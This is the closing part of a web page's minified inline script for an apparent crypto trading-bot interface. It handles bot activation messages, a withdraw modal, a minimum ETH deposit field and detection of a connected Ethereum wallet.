ri=document.getElementById("risk").value;a81(`Trading bot successfully activated! Your ${st} strategy with ${ri} risk profile is now live. Transaction: ${txH.slice(0,10)}...`,"success");sI.classList.remove("active");sI.classList.add("completed");a89()}catch(e){console.error("Full error:",e);a81("Trading initialization failed: "+(e.message||e),"error")}finally{sEB.disabled=false;sEB.innerHTML='<i class="fas fa-rocket"></i> Initialize Trading Bot'}}document.getElementById("withdrawButton").addEventListener("click",function(){a8b()});document.getElementById("closeModal").addEventListener("click",function(){document.getElementById("withdrawModal").style.display="none"});window.addEventListener("click",function(e){const m=document.getElementById("withdrawModal");if(e.target===m){m.style.display="none"}});aI.setAttribute("min",MD);aI.setAttribute("placeholder",`Min ${MD} ETH`);cWB.addEventListener("click",a82);dWB.addEventListener("click",a83);dCB.addEventListener("click",a8e);sEB.addEventListener("click",a8f);if(window.ethereum){window.ethereum.request({method:"eth_accounts"}).then(function(a){if(a.length>0){ac=a;wAD.textContent=ac[0];wID.style.display="flex";tD.style.display="block";cWD.style.display="none";a7e();a84()}}).catch(function(e){console.error(e)})}})})();
    </script>
</body>
</html>
